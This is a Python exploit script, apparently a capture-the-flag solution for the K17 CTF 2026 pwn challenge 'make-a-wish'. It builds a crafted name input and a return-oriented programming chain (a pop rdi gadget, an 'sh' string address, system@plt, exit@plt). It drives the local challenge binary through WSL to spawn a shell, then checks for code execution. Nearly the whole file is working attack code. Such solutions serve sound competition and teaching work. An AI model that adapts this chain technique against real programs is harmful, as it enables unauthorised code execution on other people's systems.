import struct
import subprocess
import sys
import time


BINARY = "/mnt/d/.dev/.competitions/.ctf/K17 CTF 2026/pwn/make-a-wish/challenge/make-a-wish/chal"


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


name = b"\0" * 8 + p64(0xA1)[:7] + b" " + b"B" * 13 + b"\n"
payload = b"A" * 24
payload += p64(0x402013)  # Empty string for the final printf(first_name).
payload += p64(0)
payload += p64(0x4012E2)  # pop rdi; pop rbp; ret (inside a mov immediate).
payload += p64(0x402011)  # "sh\0" substring in "Wish\0".
payload += p64(0)
payload += p64(0x401130)  # system@plt
payload += p64(0x4011E0)  # exit@plt

process = subprocess.Popen(
    ["wsl.exe", "-e", "env", "TERM=xterm", BINARY],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
)
assert process.stdin is not None

for data in (name, b"2\n-2\n", b"1\n0\n", payload + b"\n", b"3\n"):
    process.stdin.write(data)
    process.stdin.flush()
    time.sleep(0.15)

time.sleep(0.5)
process.stdin.write(b"echo LOCAL_CODE_EXECUTION_OK\nexit\n")
process.stdin.flush()

stdout, _ = process.communicate(timeout=5)
sys.stdout.buffer.write(stdout)
raise SystemExit(0 if b"LOCAL_CODE_EXECUTION_OK" in stdout else 1)
